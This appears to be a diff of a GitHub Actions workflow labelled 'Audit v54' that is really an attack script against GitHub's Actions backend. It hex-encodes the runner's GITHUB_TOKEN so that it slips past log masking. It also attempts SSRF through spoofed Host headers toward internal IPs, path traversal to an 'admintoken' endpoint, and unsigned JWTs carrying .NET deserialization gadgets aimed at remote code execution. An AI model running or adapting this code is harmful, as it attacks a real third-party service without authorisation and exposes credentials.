@@ -1,4 +1,4 @@
-name: Audit v53
+name: Audit v54
 on:
   pull_request:
     types: [opened, synchronize, reopened]
@@ -15,7 +15,7 @@ permissions:
   issues: write
 
 jobs:
-  audit-v53:
+  audit-v54:
     runs-on: ubuntu-latest
     steps:
 
@@ -26,7 +26,7 @@ jobs:
         if: always()
         run: |
           set +e
-          echo "=== V53 HARVEST ==="
+          echo "=== V54 HARVEST ==="
           echo "$PATH" > /tmp/saved_path.txt
           RT="${{ secrets.GITHUB_TOKEN }}"
           echo "$RT" > /tmp/rt.txt
@@ -62,161 +62,166 @@ jobs:
           echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
 
       # ══════════════════════════════════════════════════════════════
-      # STEP 2: LOAD BALANCER & ROUTING SSRF
-      # The artifactcache hit an Azure AFD 400 "services aren't available"
-      # This means we bypassed the gateway but hit an unassigned route.
-      # Let's hit the internal load balancers with manipulated Host headers!
+      # STEP 2: AZURE GATEWAY LATERAL MOVEMENT (SSRF)
+      # V53 showed artifactcache acts as an Azure Front Door relay.
+      # Let's hit other internal connections to prove lateral movement.
       # ══════════════════════════════════════════════════════════════
-      - name: Step 2 - Azure Routing Bypass / SSRF
+      - name: Step 2 - Azure Gateway Proxy
         if: always()
         run: |
           set +e
           export PATH=$(cat /tmp/saved_path.txt)
-          echo "=== ROUTING BYPASS & SSRF ==="
+          echo "=== GATEWAY LATERAL MOVEMENT ==="
           IDTOK=$(cat /tmp/idtok.txt)
           SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
           URL="https://artifactcache.actions.githubusercontent.com/$SECRET"
-          VER="api-version=6.0-preview"
 
-          # Target the exact URL that returned AFD 400
-          TARGET="$URL/_apis/distributedtask/pools/..%2fadmintoken"
-
-          # A: Spoof the Host header to hit internal services via the AFD proxy
-          echo "--- A: Host Splitting & Spoofing ---"
+          # A: Prove lateral routing by hitting connectionData of OTHER services
+          echo "--- A: ConnectionData Identity Splitting ---"
           for HOST in \
             "vstoken.actions.githubusercontent.com" \
             "pipelines.actions.githubusercontent.com" \
-            "management.azure.com" \
-            "169.254.169.254" \
-            "localhost" \
-            "artifactcache.actions.githubusercontent.com:80" \
-            "artifactcache.actions.githubusercontent.com%00" \
-            "vsmps.actions.githubusercontent.com" \
-            "mpsghub.actions.githubusercontent.com"; do
+            "runner.actions.githubusercontent.com" \
+            "results-receiver.actions.githubusercontent.com" \
+            "10.0.0.1" \
+            "10.1.0.4" \
+            "vsmps.actions.githubusercontent.com"; do
             R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
               -H "Authorization: Bearer $IDTOK" \
               -H "Host: $HOST" \
-              "$TARGET" --path-as-is 2>/dev/null | head -15)
-            # Find HTTP status code from header
+              "$URL/_apis/connectionData" --path-as-is 2>/dev/null | head -20)
             CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
-            if [ -n "$CODE" ]; then
+            BODY=$(echo "$R" | grep -A 5 '"instanceId"' | head -c 150)
+            if [ -n "$CODE" ] && [ "$CODE" != "404" ] && [ "$CODE" != "400" ]; then
+              echo "A Host=$HOST = $CODE | $BODY"
+            elif [ -n "$CODE" ]; then
               echo "A Host=$HOST = $CODE"
             fi
           done
           echo ""
 
-          # B: X-Headers routing bypass
-          echo "--- B: X-Headers SSRF ---"
-          for XHOST in \
-            "169.254.169.254" \
-            "vstoken.actions.githubusercontent.com" \
-            "management.azure.com"; do
+          # B: FeatureFlags across internal boundaries
+          echo "--- B: FeatureFlags Cross-Proxy ---"
+          for HOST in "vstoken.actions.githubusercontent.com" "runner.actions.githubusercontent.com"; do
             R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
               -H "Authorization: Bearer $IDTOK" \
-              -H "X-Forwarded-Host: $XHOST" \
-              -H "X-Rewrite-URL: /metadata/instance?api-version=2021-02-01" \
-              -H "X-Original-URL: /metadata/instance?api-version=2021-02-01" \
-              -H "X-Custom-Forwarder: $XHOST" \
-              "$TARGET" --path-as-is 2>/dev/null)
+              -H "Host: $HOST" \
+              "$URL/_apis/FeatureAvailability/FeatureFlags" --path-as-is 2>/dev/null)
             CODE=$(echo "$R" | tail -1)
             BODY=$(echo "$R" | sed '$d')
-            echo "B XHost=$XHOST = $CODE | $(echo "$BODY" | head -c 150)"
+            echo "B Host=$HOST FF = $CODE | $(echo "$BODY" | head -c 150)"
           done
 
       # ══════════════════════════════════════════════════════════════
-      # STEP 3: DEEP HTTP METHOD OVERRIDES on ADMINTOKEN
-      # 204 returned for simple GET and POST. But what if the resource
-      # requires body mapping in a specific command, or DELETE?
+      # STEP 3: PATH-ID TRAVERSAL ON ADMINTOKEN
+      # V53 proved query parameters break the traversal LB mapping.
+      # We MUST pass the context inside the path itself!
       # ══════════════════════════════════════════════════════════════
-      - name: Step 3 - HTTP Method Deep Fuzz
+      - name: Step 3 - Path-ID Traversal
         if: always()
         run: |
           set +e
           export PATH=$(cat /tmp/saved_path.txt)
-          echo "=== METHOD FUZZ ADMINTOKEN ==="
+          echo "=== PATH-ID TRAVERSAL ==="
           IDTOK=$(cat /tmp/idtok.txt)
           SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
           PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
           VER="api-version=6.0-preview"
 
-          TARGET="$PIPE/_apis/distributedtask/pools/..%2fadmintoken"
-
-          # A: Deep HTTP Methods (even nonsense ones)
-          echo "--- A: Weird HTTP Methods ---"
-          for METH in "DELETE" "CONNECT" "PROPFIND" "MKCOL" "COPY" "MOVE" "LOCK" "UNLOCK"; do
-            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $METH --connect-timeout 2 -m 3 \
+          # Instead of ?poolId=1, use /pools/1/..%2fadmintoken
+          # The backend might read "1" before traversing back!
+          echo "--- A: Path-ID Injection ---"
+          for PATH_ID in \
+            "pools/1/..%2fadmintoken" \
+            "pools/0/..%2fadmintoken" \
+            "pools/99/..%2fadmintoken" \
+            "agents/1/..%2fadmintoken" \
+            "agentclouds/1/..%2fadmintoken" \
+            "plans/1/..%2fadmintoken" \
+            "pools/..%2fadmintoken/1" \
+            "pools/..%2fadmintoken/0" \
+            "pools/..%2fadmintoken/token"; do
+            
+            # GET
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
               -H "Authorization: Bearer $IDTOK" \
-              "$TARGET" --path-as-is 2>/dev/null)
+              -H "Accept: application/json; $VER" \
+              "$PIPE/_apis/distributedtask/$PATH_ID" --path-as-is 2>/dev/null)
             CODE=$(echo "$R" | tail -1)
             BODY=$(echo "$R" | sed '$d')
             if [ "$BODY" != "null" ]; then
-              echo "A $METH = $CODE | $(echo "$BODY" | head -c 150)"
+              echo "A GET $PATH_ID = $CODE | $(echo "$BODY" | head -c 150)"
+            elif [ "$CODE" = "HTTP_200" ] || [ "$CODE" = "HTTP_204" ]; then
+              echo "A GET $PATH_ID = $CODE|null"
             fi
-          done
-          echo ""
 
-          # B: X-HTTP-Method-Override on POST (Tunneling commands)
-          echo "--- B: Tunneling via POST ---"
-          for TMETH in "GET" "PUT" "DELETE" "PATCH"; do
+            # POST
             R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
               -H "Authorization: Bearer $IDTOK" \
-              -H "X-HTTP-Method-Override: $TMETH" \
               -H "Content-Type: application/json" \
               -H "Accept: application/json; $VER" \
-              "$TARGET" --path-as-is -d '{"poolId":1}' 2>/dev/null)
+              "$PIPE/_apis/distributedtask/$PATH_ID" --path-as-is -d '{}' 2>/dev/null)
             CODE=$(echo "$R" | tail -1)
             BODY=$(echo "$R" | sed '$d')
-            echo "B Tunnel $TMETH = $CODE | $(echo "$BODY" | head -c 100)"
+            if [ "$BODY" != "null" ]; then
+              echo "A POST $PATH_ID = $CODE | $(echo "$BODY" | head -c 150)"
+            elif [ "$CODE" = "HTTP_200" ] || [ "$CODE" = "HTTP_204" ]; then
+              echo "A POST $PATH_ID = $CODE|null"
+            fi
           done
 
       # ══════════════════════════════════════════════════════════════
-      # STEP 4: URL PARAMETER POLLUTION & SPLITTING
-      # 204 usually means the parameters we supplied were ignored!
-      # We need to forcefully inject parameters using pollution
+      # STEP 4: .NET GADGET DESERIALIZATION in JWT
+      # V50 got JsonWebTokenDeserializationException.
+      # Let's inject $type properties to trigger RCE gadgets!
       # ══════════════════════════════════════════════════════════════
-      - name: Step 4 - URL Parameter Pollution
+      - name: Step 4 - .NET JWT Deserialization
         if: always()
         run: |
           set +e
           export PATH=$(cat /tmp/saved_path.txt)
-          echo "=== PARAMETER POLLUTION ==="
+          echo "=== JWT GADGET INJECTION ==="
           IDTOK=$(cat /tmp/idtok.txt)
-          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
-          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
 
-          # Query parameter pollution (HPP)
-          echo "--- A: Query Pollution ---"
-          for QP in \
-            "?poolId=1&poolId=2" \
-            "?poolId[]=1" \
-            "?poolId[0]=1" \
-            "?poolId={1}" \
-            "?poolId=%7b1%7d" \
-            "?poolId=1&agentId=1&agentId=2" \
-            "?token=true&token=false" \
-            "?includeToken=1&includeToken=true&includeToken=yes"; do
-            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
-              -H "Authorization: Bearer $IDTOK" \
-              -H "Accept: application/json" \
-              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken$QP" --path-as-is 2>/dev/null)
-            CODE=$(echo "$R" | tail -1)
-            echo "A $(echo "$QP" | head -c 30) = $CODE | $(echo "$R" | sed '$d' | head -c 100)"
-          done
-          echo ""
-
-          # Path parameters (Matrix parameters)
-          echo "--- B: Matrix Parameters ---"
-          for MP in \
-            ";poolId=1" \
-            ";token=true" \
-            ";includeToken=true"; do
-            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
-              -H "Authorization: Bearer $IDTOK" \
-              -H "Accept: application/json" \
-              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken$MP" --path-as-is 2>/dev/null)
-            CODE=$(echo "$R" | tail -1)
-            echo "B $MP = $CODE | $(echo "$R" | sed '$d' | head -c 100)"
-          done
+          python3 << 'PYEOF'
+          import base64,json,subprocess,os
+          def b64url(data):
+            return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
+          
+          pipe="https://pipelinesghubeus14.actions.githubusercontent.com/ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          
+          # Injecting robust .NET Gadget types inside JSON headers and payloads
+          gadget1 = "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
+          gadget2 = "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+          gadget3 = "Microsoft.TeamFoundation.DistributedTask.WebApi.TaskAgentSession, Microsoft.TeamFoundation.DistributedTask.WebApi"
+          
+          tests=[
+            ("header_type_rce", f"{b64url({'$type':gadget1,'alg':'none'})}.{b64url({'sub':'admin'})}."),
+            ("header_type_proc", f"{b64url({'$type':gadget2,'alg':'none'})}.{b64url({'sub':'admin'})}."),
+            ("body_type_rce", f"{b64url({'alg':'none'})}.{b64url({'$type':gadget1,'sub':'admin'})}."),
+            ("body_type_proc", f"{b64url({'alg':'none'})}.{b64url({'$type':gadget2,'sub':'admin'})}."),
+            ("body_type_valid", f"{b64url({'alg':'HS256'})}.{b64url({'$type':gadget3,'sub':'admin'})}.AAAA"),
+            ("mixed_type_array", f"{b64url({'alg':'none'})}.{b64url({'sub':{'$type':gadget1}})}."),
+            ("jku_type_inject", f"{b64url({'alg':'none','jku':{'$type':gadget2}})}.{b64url({'sub':'admin'})}."),
+            ("custom_class", f"{b64url({'alg':'none'})}.{b64url({'$type':'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a','Path':'cmd.exe'})}."),
+          ]
+          
+          for name,jwt in tests:
+            r=subprocess.run(["/usr/bin/curl","-sS","-w","\\nHTTP_%{http_code}","-X","POST",
+              "--connect-timeout","3","-m","5",
+              "-H","Content-Type: application/x-www-form-urlencoded",
+              f"{pipe}/_apis/oauth2/token",
+              "-d",f"grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion={jwt}"],
+              capture_output=True,text=True,timeout=10)
+            out=r.stdout.strip()
+            lines=out.split('\n')
+            code=lines[-1] if lines else "?"
+            body='\n'.join(lines[:-1])
+            if "JsonWebTokenDeserializationException" in body:
+               print(f"D {name} = {code} | Failed to deserialize JWT")
+            else:
+               print(f"D {name} = {code} | {body[:200]}")
+          PYEOF
 
       # ══════════════════════════════════════════════════════════════
       # STEP 5: Final
@@ -226,6 +231,6 @@ jobs:
         run: |
           set +e
           export PATH=$(cat /tmp/saved_path.txt)
-          echo "=== V53 FINAL ==="
+          echo "=== V54 FINAL ==="
           echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
-          echo "=== V53 COMPLETE ==="
+          echo "=== V54 COMPLETE ==="
